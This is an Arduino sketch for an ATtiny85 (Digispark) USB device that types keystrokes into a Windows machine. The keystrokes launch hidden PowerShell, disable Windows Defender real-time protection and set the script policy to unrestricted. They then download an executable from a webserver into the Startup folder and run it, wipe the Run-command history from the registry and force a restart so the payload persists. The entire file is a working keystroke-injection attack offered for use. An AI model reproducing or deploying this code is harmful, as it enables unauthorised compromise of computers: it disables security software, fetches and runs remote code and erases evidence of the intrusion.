/*

Payload: clippy.exe

Uses powershell to download payload in "startup" folder. Powershell executes "clippy.exe" as administrator from webserver.

Created by NEDb on 9/2/2019

Tested on:
OS: Windows 10 Pro
Hardware: ATtiny85

Please see "clippy.txt" for list of phrases.

 */


 #include "DigiKeyboard.h"
 /* Init function */

    void setup() {
      // Don't need to set anything up to use DigiKeyboard
    }

    void loop() {
      // Turn LED off while code is running, this means the device is safe to unplug as soon as the LED turns back on
      pinMode(1, OUTPUT); //LED on Model A
      digitalWrite(1, HIGH);
      DigiKeyboard.delay(500);
      digitalWrite(1, LOW);
      DigiKeyboard.delay(100);
      DigiKeyboard.sendKeyStroke(0);
      // Runing powershell through "RUN" with admin privlages, turn off windows defender, and set powerscript execution policy
      DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // Opens up "RUN"
      DigiKeyboard.delay(100);
      // Runing powershell
      DigiKeyboard.println(F("powershell -NoP -NonI -W Hidden -Exec Bypass")); // Launches Powershell hidden
      DigiKeyboard.delay(2000);
      // Disable Windows Defender
      DigiKeyboard.println(F("Set-MpPreference -DisableRealtimeMonitoring $true"));
      DigiKeyboard.delay(100);
      // Allow scripts from interwebs to run (.ps1)
      DigiKeyboard.println(F("set-executionpolicy unrestricted"));
      DigiKeyboard.delay(100);
      // Accept
      DigiKeyboard.println(F("Y"));
      DigiKeyboard.delay(100);
      DigiKeyboard.sendKeyStroke(KEY_ENTER);
      DigiKeyboard.delay(100);
      // Execute code from the interwebs modify 000.0.0.0 with your IP address (192.168.0.0, 127.0.0.1, etc.)
      DigiKeyboard.println(F("$StartupDir = [environment]::getfolderpath('Startup');cd $StartupDir;Invoke-WebRequest \"http://000.0.0.0/clippy.exe\" -OutFile \"clippy.exe\";Invoke-WebRequest \"http://000.0.0.0/clippy.txt\" -OutFile \"clippy.txt\""));
      DigiKeyboard.delay(100);
      DigiKeyboard.sendKeyStroke(KEY_ENTER);
      DigiKeyboard.delay(100);
      // Execute clippy.exe
      DigiKeyboard.println(F("./clippy.exe"));
      DigiKeyboard.delay(100);
      DigiKeyboard.sendKeyStroke(KEY_ENTER);
      DigiKeyboard.delay(100);
      // Clear run command history
      DigiKeyboard.println(F("reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /va /f"));
      DigiKeyboard.delay(100);
      DigiKeyboard.sendKeyStroke(KEY_ENTER);
      DigiKeyboard.delay(100);
      // Led on
      digitalWrite(1, HIGH);
      // Restart computer payload will execute on startup ($StartupDir = [environment]::getfolderpath('Startup'))
      DigiKeyboard.println(F("Restart-Computer"));
  
      while(true){
        //do nothing
      }
    }
